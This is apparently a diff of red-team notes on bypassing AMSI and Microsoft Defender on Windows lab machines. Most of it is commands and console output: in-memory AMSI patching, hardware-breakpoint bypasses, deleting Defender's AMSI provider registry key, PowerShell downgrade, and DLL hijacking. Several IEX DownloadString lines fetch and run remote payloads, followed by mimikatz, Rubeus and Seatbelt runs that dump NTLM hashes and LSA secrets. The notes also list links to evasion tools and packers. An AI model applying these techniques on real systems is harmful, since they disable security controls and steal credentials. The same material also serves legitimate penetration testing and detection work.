+By modifying it dynamically at runtime, we can disable AMSI’s scanning capabilities before the payload even reaches AmsiScanBuffer or AmsiScanString. 
+This makes our evasion technique more stealthy and efficient. However, this AMSI bypass technique is effective only works for PowerShell scripts. 
+It won't work to load C# assemblies like Rubeus and Certify. 
+Though, you can still run offensive tools developed with unmanaged code (e.g., C/C++) embeded in PowerShell scripts via reflected code loading in-memory.
 
-Step 2 - I executed the packed version of "Sharp-Killer" to successfully patch the AMSI.dll in my PowerShell session...
+There are multiple blogs and GitHub projects that share example of code to patch the AMSI.dll in memory (AmsiOpenSession).
+=> https://github.com/raskolnikov90/LainAmsiOpenSession
+=> https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes/
+=> https://github.com/anonymous300502/Nuke-AMSI
+=> https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
 
-PS C:\Users\auditor> invoke-mimikatz
-At line:1 char:1
-+ invoke-mimikatz
-+ ~~~~~~~~~~~~~~~
-This script contains malicious content and has been blocked by your antivirus software.
-    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
-    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
 
-PS C:\Users\auditor> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, AntivirusSignatureLastUpdated | FL
+--------------------------------------------------------------------------------------------------------------------------------
+PoC n°1 - Patching the "Amsi.dll" in memory (AmsiOpenSession) on a Windows Server 2022 protected by the MS Defender antivirus
+          => Test with an obfuscated version of the script "Nuke-AMSI"
+--------------------------------------------------------------------------------------------------------------------------------
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\temp> Get-ComputerInfo | Select WindowsProductName
+
+WindowsProductName
+------------------
+Windows Server 2022 Standard Evaluation
+
+
+PS C:\temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,AntispywareEnabled, AntivirusSIgnatureLastUpdated|FL
 
 AntivirusEnabled              : True
 RealTimeProtectionEnabled     : True
+BehaviorMonitorEnabled        : True
 IoavProtectionEnabled         : True
 AntispywareEnabled            : True
-AntivirusSignatureLastUpdated : 5/8/2025 4:35:53 PM
+AntivirusSIgnatureLastUpdated : 8/16/2025 4:35:15 AM
 
-PS C:\Users\auditor>
 
-PS C:\Users\auditor> Super-Sharp-K1ll3r.exe
+PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.23:8080/Part1.txt');
+PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.23:8080/Part2.txt');
+PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.23:8080/Part3.txt');
+Starting AMSI modification script...
+Modifying all PowerShell processes...
+Modifying process with ID System.Diagnostics.Process (powershell).Id
+Modifying AMSI for process ID: 4348
+Loading amsi.dll...
+Getting address of AmsiOpenSession function...
+Changing memory protection at address 140708326458275 to PAGE_EXECUTE_READWRITE...                                           
+Patching memory at address 140708326458275 with byte 0xEB...                                                                 
+Memory patched successfully at address 140708326458275.                                                                      
+Restoring original memory protection...                                                                                      
+Closing handle to process with ID 4348.
+0
+AMSI modification script completed.
 
-	Monitoring for Powershell.exe
-	[+] AMSI Patched: 10488
-	exit
+PS C:\temp> invoke-mimikatz
 
-PS C:\Users\auditor> invoke-mimikatz
-invoke-mimikatz : The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or
-operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try
-again.
+invoke-mimikatz : The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or operable
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ invoke-mimikatz
++ ~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (invoke-mimikatz:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\temp> PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.23:8080/invoke-mimi-custom.ps1');
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 226789 (00000000:000375e5)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : SERVER-WIN2022
+Logon Server      : SERVER-WIN2022
+Logon Time        : 8/16/2025 6:30:35 PM
+SID               : S-1-5-21-3336774573-1234467604-3718094125-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : SERVER-WIN2022
+         * NTLM     : 6699270562fdbd1e74c7d3<SNIP>
+<SNIP>
+
+
+-------------------------------------------------------------------------------------------------------------------------------
+PoC n°2 - Patching the "Amsi.dll" in memory (AmsiOpenSession) on a Windows 10 Laptop protected by the MS Defender antivirus 
+          => Test with an obfuscated version of the script "LainAmsiOpenSession"
+-------------------------------------------------------------------------------------------------------------------------------
+
+C:\Temp>powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,AntispywareEnabled, 
+            AntivirusSIgnatureLastUpdated|FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+BehaviorMonitorEnabled        : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSIgnatureLastUpdated : 8/17/2025 3:41:41 AM
+
+
+PS C:\Temp> $var1 = (New-Object Net.WebClient).DownloadString('http://192.168.1.23:8080/lainamsiopensession-part1.txt');
+PS C:\Temp> $var2 = (New-Object Net.WebClient).DownloadString('http://192.168.1.23:8080/lainamsiopensession-part2.txt');
+PS C:\Temp> iex($var1)
+PS C:\Temp> iex($var2)
+True
+
+PS C:\Temp> 
+PS C:\Temp> invoke-mimikatz
+invoke-mimikatz : The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or operable program. 
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
 At line:1 char:1
 + invoke-mimikatz
 + ~~~~~~~~~~~~~~~
@@ -878,9 +1434,118 @@ At line:1 char:1
 => No more AMSI  :)
 
 
----------------------------------------------------------------------------------------------------------------------------------------------------
-➤ AMSI bypass technique 3 - Modify a Windows registry key to disable the AMSI (admin priv required)
----------------------------------------------------------------------------------------------------------------------------------------------------
+***************************************************************************************************************************************************
+➤ AMSI bypass technique 4 - Using hardware breakpoint on "AmsiScanBuffer"
+***************************************************************************************************************************************************
+
+Using hardware breakpoints has the great advantage that userland hooks don't need to be bypassed, the integrity of the targeted DLLs remains valid, 
+and memory scanners can't detect manipulations. 
+Many AV/EDR products don't detect this technique yet.
+
+Multiple PoCs and tools are available:
+--------------------------------------
+=> https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Using-Hardware-Breakpoints
+=> https://gist.github.com/susMdT/360c64c842583f8732cc1c98a60bfd9e
+=> https://github.com/rad9800/misc/blob/main/hooks/etw-amsi-llex-patch.c
+=> https://gist.github.com/CCob/fe3b63d80890fafeca982f76c8a3efdf
+=> https://github.com/racoten/BetterNetLoader
+=> https://github.com/icyguider/LightsOut
+
+
+----------------------------------------------------------------------------------------------------------------------------------
+PoC - AMSI bypass using hardware breakpoint on "AmsiScanBuffer" on a Windows 2022 server protected by the MS Defender antivirus 
+      => Test with an obfuscated version of the tool "BetterNetLoader"
+----------------------------------------------------------------------------------------------------------------------------------
+
+=> https://github.com/racoten/BetterNetLoader
+
+This tool is a version of "NetLoader" that execute .Net assemblies and bypass ETW and AMSI using hardware breakpoints.
+
+
+C:\temp> Packed_tool.exe
+Usage:
+  Packed_tool.exe -path <location> -a <cleartext arguments>
+  Packed_tool.exe -path <location> -b64 <base64 encoded arguments>
+
+Options:
+  -path    Specify the location of the assembly. If the path begins with "http",
+           an HTTP request is made; otherwise, it is treated as a local file.
+  -a       Provide cleartext arguments for DotnetExecute.
+  -b64     Provide base64 encoded arguments for DotnetExecute.
+
+C:\Users\Administrator> powershell -c "Get-ComputerInfo | Select WindowsProductName"
+
+WindowsProductName
+------------------
+Windows Server 2022 Standard Evaluation
+
+
+C:\Users\Administrator> powershell -c "Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled, 
+                                       AntivirusSIgnatureLastUpdated|FL"
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSIgnatureLastUpdated : 8/18/2025 5:19:10 AM
+
+
+C:\Users\Administrator> powershell -c "wget -uri http://192.168.1.144:8080/Packed_tool.exe -OutFile C:\Users\Administrator\Packed_tool.exe"
+C:\Users\Administrator> powershell -c "wget -uri http://192.168.1.144:8080/msvcp140.dll -OutFile C:\Users\Administrator\msvcp140.dll"
+
+
+C:\Users\Administrator> Packed_tool.exe -path http://192.168.1.144:8080/RuB-3us.exe -a triage
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+
+Action: Triage Kerberos Tickets (All Users)
+
+[*] Current LUID    : 0x83d32
+
+ ---------------------------------------
+ | LUID | UserName | Service | EndTime |
+ ---------------------------------------
+ ---------------------------------------
+
+
+C:\Users\Administrator> Packed_tool.exe -path http://192.168.1.144:8080/SeaTbE1t.exe -a AMSIProviders
+
+
+                        %&&@@@&&
+                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
+                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
+%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
+#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
+#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
+#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
+###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
+#####%######################  %%%..                       @////(((&%%%%%%%################
+                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
+                        &%%&&&%%%%%        v1.2.2         ,(((&%%%%%%%%%%%%%%%%%,
+                         #%%%%##,
+
+
+====== AMSIProviders ======
+
+  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
+  ProviderPath                   : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0\MpOav.dll"
+
+[*] Completed collection in 0.067 seconds
+
+
+
+***************************************************************************************************************************************************
+➤ AMSI bypass technique 5 - Modify a Windows registry key to disable the AMSI (admin priv required)
+***************************************************************************************************************************************************
 
 AMSI Providers are responsible for the scanning process by the antivirus product and are registered in a location in the registry. 
 The GUID for Microsoft Defender is: HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
@@ -893,9 +1558,9 @@ PS C:\> reg query HKLM\SOFTWARE\Microsoft\AMSI\Providers\
 PS C:\> Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
 
 
----------------------------------------------------------------------------------------------------------------------------------------------------
-➤ AMSI bypass technique 4 - PowerShell downgrade attack (use PowerShell version 2 which doesn't support AMSI)
----------------------------------------------------------------------------------------------------------------------------------------------------
+***************************************************************************************************************************************************
+➤ AMSI bypass technique 6 - PowerShell downgrade attack (use PowerShell version 2 which doesn't support AMSI)
+***************************************************************************************************************************************************
 
 Even though that Windows PowerShell 2.0 has been deprecated by Microsoft, in many companies it hasn’t been removed from all the Windows systems
 due to "technical debt" issues and for compatibilty reason with old applications.
@@ -904,9 +1569,9 @@ Older versions of PowerShell (v1 and v2) don't contain newer security features t
 Note: With PowerShell version 2 we can used the "old" offensive framework such as PowerSploit, Nishang, etc.                    
 (https://github.com/PowerShellMafia/PowerSploit/CodeExecution/)
 
----------------------------------------------------------
-PoC - Test with a Windows 2019 server (with Defender AV)
----------------------------------------------------------
+--------------------------------------------------------------------------------------------------
+PoC - PowerShell downgrade test on a Windows 2019 server protected by the MS Defender antivirus 
+--------------------------------------------------------------------------------------------------
 
 PS C:\Temp> systeminfo
 
@@ -966,17 +1631,19 @@ mimikatz(powershell) # exit
 Bye!
 
 
----------------------------------------------------------------------------------------------------------------------------------------------------
-➤ AMSI bypass technique 5 - AMSI dll hijacking
----------------------------------------------------------------------------------------------------------------------------------------------------
+***************************************************************************************************************************************************
+➤ AMSI bypass technique 7 - AMSI dll hijacking
+***************************************************************************************************************************************************
 
 DLL Hijacking can be used to evade AMSI by creating a non-legitimate amsi.dll file and plant it on the same folder as PowerShell.
+This only works if an old version of PowerShell/.Net framework is installed on the target Windows machine. 
+By default, it won't work on a fresh install of a modern Windows OS such as Windows 11 or Windows server 2022.
 
 => https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/
       
----------------------------------------------------------
-PoC - Windows 10 laptop (protected by Microsoft Defender)
----------------------------------------------------------
+------------------------------------------------------------------------------------------------
+PoC n°1 - AMSI dll hijacking test on a Windows 10 laptop (protected by Microsoft Defender)
+------------------------------------------------------------------------------------------------
 
 Step 1 - Copy all the PowerShell files (x64) in the folder "C:\temp\PowerShell-v1.0-win-x64\"
          Rename "Powershell.exe" as "SuperPowerSHELL.exe"
@@ -997,6 +1664,19 @@ OS Manufacturer:           Microsoft Corporation
 OS Configuration:          Member Workstation
 OS Build Type:             Multiprocessor Free
 <SNIP>
+
+PS C:\temp> $PSVersionTable
+
+Name                           Value
+----                           -----
+PSVersion                      5.1.19041.6216
+PSEdition                      Desktop
+PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
+BuildVersion                   10.0.19041.6216
+CLRVersion                     4.0.30319.42000
+WSManStackVersion              3.0
+PSRemotingProtocolVersion      2.3
+SerializationVersion           1.1.0.1
 
 C:\Windows\system32> cd C:\Temp\PowerShell-v1.0-win-x64
 
@@ -1065,8 +1745,149 @@ SID               : S-1-5-21-666114207-261065646-224150901-1121
          * DPAPI    : ed5d6484fd4e412f2a9659<SNIP>
 
 
+--------------------------------------------------------------------------------------------------------------------------------------
+PoC n°2 - AMSI dll hijacking test on a Windows 10 laptop (protected by MS Defender) using an obfuscated version of the tool 'PowerOPS'
+--------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\temp> $PSVersionTable
+
+Name                           Value
+----                           -----
+PSVersion                      5.1.19041.6216
+PSEdition                      Desktop
+PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
+BuildVersion                   10.0.19041.6216
+CLRVersion                     4.0.30319.42000
+WSManStackVersion              3.0
+PSRemotingProtocolVersion      2.3
+SerializationVersion           1.1.0.1
+
+PS C:\temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,
+ 	        AntispywareEnabled, AntivirusSIgnatureLastUpdated|FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+BehaviorMonitorEnabled        : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSIgnatureLastUpdated : 8/17/2025 3:41:41 AM
+
+
+C:\temp> Power.exe
+
+Power Console
+--------- Welcome ---------
+
+PS:\> invoke-mimi-custom
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 1122623 (00000000:0011213f)
+Session           : Interactive from 1
+User Name         : auditor
+Domain            : LAB
+Logon Server      : DC2
+Logon Time        : 8/17/2025 9:19:38 PM
+SID               : S-1-5-21-666114207-261065646-224150901-1121
+        msv :
+         [00000003] Primary
+         * Username : auditor
+         * Domain   : LAB
+         * NTLM     : 01c3e95ac8caca3965621906<SNIP>
+<SNIP>
+
+
+
+
+***************************************************************************************************************************************************
+➤ AMSI bypass technique 8 - Lifetime AMSI bypass by @ZeroMemoryEx 
+***************************************************************************************************************************************************
+
+Lifetime AMSI bypass by @ZeroMemoryEx 
+=> https://github.com/ZeroMemoryEx/Amsi-Killer
+
+Lifetime AMSI bypass by @ZeroMemoryEx ported to .NET Framework 4.8.
+=> https://github.com/S1lkys/SharpKiller
+
+Note: These 2 tools (Amsi-Killer & SharpKiller) scan for new PowerShell processes every 0.5 seconds and automatically patch new PowerShell instances.
+
+---------------------------------------------------------------------------------------------------------------------------------
+PoC - AMSI bypass using an obfuscated version of the tool "SharpKiller" on a Windows 2022 server (protected by MS Defender)
+---------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\Users\auditor> wget -uri http://192.168.1.144:8080/Super-Sharp-K1ll3r.exe -OutFile C:\Users\auditor\Super-Sharp-K1ll3r.exe
+
+PS C:\Users\auditor> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 5/8/2025 4:35:53 PM
+
+
+PS C:\Users\auditor> Super-Sharp-K1ll3r.exe
+
+	Monitoring for Powershell.exe
+	[+] AMSI Patched: 10488
+	exit
+
+
+PS C:\Users\auditor> invoke-mimikatz
+invoke-mimikatz : The term 'invoke-mimikatz' is not recognized as the name of a cmdlet, function, script file, or
+operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try
+again.
+At line:1 char:1
++ invoke-mimikatz
++ ~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (invoke-mimikatz:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+
+PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('https://192.168.1.144/Invoke-Rubeus.ps1');
+
+PS C:\Users\Administrator> invoke-rubeus
+
+cmdlet Invoke-Rubeus at command pipeline position 1
+Supply values for the following parameters:
+Command: help
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+
+ Ticket requests and renewals:
+
+    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] 
+		[/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256] 
+		[/principaltype:principal|enterprise|x500|srv_xhost|srv_host|srv_inst]
+
+    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe 
+		[/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256] 
+		[/principaltype:principal|enterprise|x500|srv_xhost|srv_host|srv_inst]
+
+<SNIP>
+
+=> No more AMSI  :)
+
+
 ===================================================================================================================================================
-V.   Tools that bypass AV products (AMSI+ETW patching) and allow to load and execute straight in-memory offensive .Net assemblies
+V.   Tools that bypass AV products (AMSI+ETW patching) and allow to load and execute straight in-memory offensive C# .Net assemblies
 ===================================================================================================================================================
 
 There are many open-source tools on GitHub that allow to patch the AMSI (+ the event tracing i.e. ETW) and to load .Net assemblies (C#) from a remote web 
@@ -1074,18 +1895,19 @@ server URL or from a local directory.
 
 Examples of tools
 ------------------
-=> PowerSharpPack 	- https://github.com/S3cur3Th1sSh1t/PowerSharpPack
-=> Invoke-SharpLoader	- https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader
-=> NetLoader 		- https://github.com/Flangvik/NetLoader
-=> EAPrimer 		- https://github.com/m8sec/EAPrimer
-=> ExecRemoteNET	- https://github.com/m1ddl3w4r3/ExecRemoteNET
-=> ...
+➤ NetLoader 		    	 - https://github.com/Flangvik/NetLoader
+➤ BetterNetLoader	    	 - https://github.com/racoten/BetterNetLoader
+➤ EAPrimer 		     	 - https://github.com/m8sec/EAPrimer
+➤ PowerSharpPack 	     	 - https://github.com/S3cur3Th1sSh1t/PowerSharpPack
+➤ Invoke-SharpLoader	     - https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader
+➤ Invoke-PoSH-CsharpPacker  - https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-SharpPacker
+➤ ...
 
 
----------------------------------------------------------------------------------------------------------------------------------------------------
+***************************************************************************************************************************************************
 ➤ Test 1 - PoC with 'EAPrimer' on a Windows server 2022 (protected by MS Defender AV) 
-            -> Download & execution in-memory of hacking tools without detection
----------------------------------------------------------------------------------------------------------------------------------------------------
+            -> Download and execute in-memory C# hacking tools without being detected by AV products
+***************************************************************************************************************************************************
 
 The tool "EAPrimer" can be used to load .Net assemblies (C#) from a filepath (local directory) or a URL. 
 On startup, it will attempt to perform in-memory patching of AMSI to bypass detection. 
@@ -1133,7 +1955,7 @@ Original Install Date:     5/2/2025, 10:44:40 AM
 
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled,
-						  AntivirusSignatureLastUpdated | FL
+						  						  AntivirusSignatureLastUpdated | FL
 
 AntivirusEnabled              : True
 RealTimeProtectionEnabled     : True
@@ -1164,7 +1986,7 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5970404680bafc1<snip>
 dpapi_machinekey:d3188b46fabab60b285682fd45ede236<snip>
 dpapi_userkey:3204da5913299b84721884babfe89089582<snip>
 [*] NL$KM
-NL$KM:eaf6c281bf8b382293e87ad476a3dc27ee89f36779851e5a6f642d8621184a10762ffa62f182990621b4febb48923d11911ffcfd27b<snip>
+NL$KM:eaf6c281bf8b382293e87ad476a3dc27ee89f36779851e5a6f642d8621184a10762ffa62f182990621b4febb48923d11<snip>
 ---------------Script execution completed---------------
 
 
@@ -1193,34 +2015,27 @@ Action: Triage Kerberos Tickets (All Users)
  ---------------------------------------
 
 
----------------------------------------------------------------------------------------------------------------------------------------------------
-➤ Test 2 - PoC with 'ExecRemoteNET' on a Windows server 2022 (protected by MS Defender AV) 
-            -> Download & execution in-memory of hacking tools without detection
----------------------------------------------------------------------------------------------------------------------------------------------------
+***************************************************************************************************************************************************
+➤ Test 2 - PoC with an improved version of the tool 'InMemoryNET' on a Windows server 2022 (protected by MS Defender AV) 
+            -> Download and execute in-memory C# hacking tools without being detected by AV products
+***************************************************************************************************************************************************
 
-=> https://github.com/m1ddl3w4r3/ExecRemoteNET
-=> https://github.com/D1rkMtr/ExecRemoteAssembly (note: this repo does not exist anymore)
+Improved version of the tool "https://github.com/mez-0/InMemoryNET"
 
 This tool allows to download and execute directly into memory a remote .Net assembly with:
 > AMSI patching
 > ETW patching
 > arguments passing
 
-Limitation: it can only run .NET assemblies that are based on C#.
-
-Reminder: 
-- An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. 
-- Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications.
-
-
-PoC - Download & execution straight into memory of Rubeus.exe & Seatbelt.exe on a Windows server 2022 (protected by MS Defender AV)
------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------
+PoC - Download & execute straight in-memory the tools Rubeus.exe & Seatbelt.exe on a Windows server 2022 (protected by MS Defender AV)
+----------------------------------------------------------------------------------------------------------------------------------------
 
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
-PS C:\Users\Administrator\Documents\ExecRemoteNet> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled,
-						   AntivirusSignatureLastUpdated | FL
+PS C:\Users\Administrator\Documents\InMemoryNetv2> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled,
+						   						   AntivirusSignatureLastUpdated | FL
 
 AntivirusEnabled              : True
 RealTimeProtectionEnabled     : True
@@ -1229,17 +2044,17 @@ AntispywareEnabled            : True
 AntivirusSignatureLastUpdated : 5/26/2025 6:31:01 AM
 
 
-PS C:\Users\Administrator\Documents\ExecRemoteNet> ls
+PS C:\Users\Administrator\Documents\InMemoryNetv2> ls
 
-    Directory: C:\Users\Administrator\Documents\ExecRemoteNet
+    Directory: C:\Users\Administrator\Documents\InMemoryNetv2
 
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
--a----          5/2/2025   7:37 PM         288768 ExecRemoteNET.exe
+-a----          5/2/2025   7:37 PM         288768 InMemoryNetv2.exe
 -a----        12/12/2022  11:41 PM         928112 msvcp140d.dll
 
 
-PS C:\Users\Administrator\Documents\ExecRemoteNet> .\ExecRemoteNET.exe http://192.168.1.144:8080/Rubeus.exe currentluid
+PS C:\Users\Administrator\Documents\InMemoryNetv2> .\InMemoryNetv2.exe http://192.168.1.144:8080/Rubeus.exe currentluid
 [-] Failed to load amsi.dll
 [+] Patched etw!
 [+] Patched amsi!
@@ -1261,10 +2076,10 @@ PS C:\Users\Administrator\Documents\ExecRemoteNet> .\ExecRemoteNET.exe http://19
 
 [*] Current LogonID (LUID) : 0x2e937b (3052411)
 
-PS C:\Users\Administrator\Documents\ExecRemoteNet>
+PS C:\Users\Administrator\Documents\InMemoryNetv2>
 
 
-PS C:\Users\Administrator\Documents\ExecRemoteNet> ExecRemoteNet.exe http://192.168.1.144:8080/Seatbelt.exe -group=remote
+PS C:\Users\Administrator\Documents\InMemoryNetv2> InMemoryNetv2.exe http://192.168.1.144:8080/Seatbelt.exe -group=remote
 [-] Failed to load amsi.dll
 [+] Patched etw!
 [+] Patched amsi!
@@ -1302,24 +2117,27 @@ Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available 
 
 
 ===================================================================================================================================================
-VI.   Tools that bypass AV products and allow to load and execute straight in-memory offensive PE files
+VI.   Tools that bypass AV products and allow to load and execute straight in-memory offensive PE files (un-managed code like C/C++ programs)
 ===================================================================================================================================================
 
-There are many open-source tools on GitHub that allow to load and execute straight in-memory offensive PE files from a remote web server URL or from a local directory.
+There are many open-source tools on GitHub that allow to load and execute straight in-memory offensive PE files from a remote web server URL 
+or from a local directory.
 
 Examples of tools
 ------------------
-> Pyramid		       - https://github.com/naksyn/Pyramid
-> FilelessPELoader	       - https://github.com/SaadAhla/FilelessPELoader
-> Invoke-PoSH-PePacker	       - https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-PePacker
-> SharpReflectivePEInjection   - https://github.com/cpu0x00/SharpReflectivePEInjection
-> ...
+➤ RunPE			      - https://github.com/nettitude/RunPE
+➤ Pyramid		       	  - https://github.com/naksyn/Pyramid
+➤ FilelessPELoader	      - https://github.com/SaadAhla/FilelessPELoader
+➤ Invoke-PoSH-PePacker	  - https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-PePacker
+➤ FilelessRemotePE	      - https://github.com/ASkyeye/FilelessRemotePE
+➤ DojoLoader		      - https://github.com/naksyn/DojoLoader
+➤ ...
 
 
----------------------------------------------------------------------------------------------------------------------------------------------------
+***************************************************************************************************************************************************
 ➤ Test 1 - PoC with my packer 'Invoke-PoSH-PePacker' on a Windows server 2022 protected by the MS Defender antivirus
-            -> Download & execution in-memory of hacking tools without detection
----------------------------------------------------------------------------------------------------------------------------------------------------
+            -> Download and execute in-memory hacking tools without being detected by AV products
+***************************************************************************************************************************************************
 
 > 'Invoke-PoSH-PePacker' allows to pack and encrypt offensive PE files in order to bypass AV solutions such as Windows Defender.
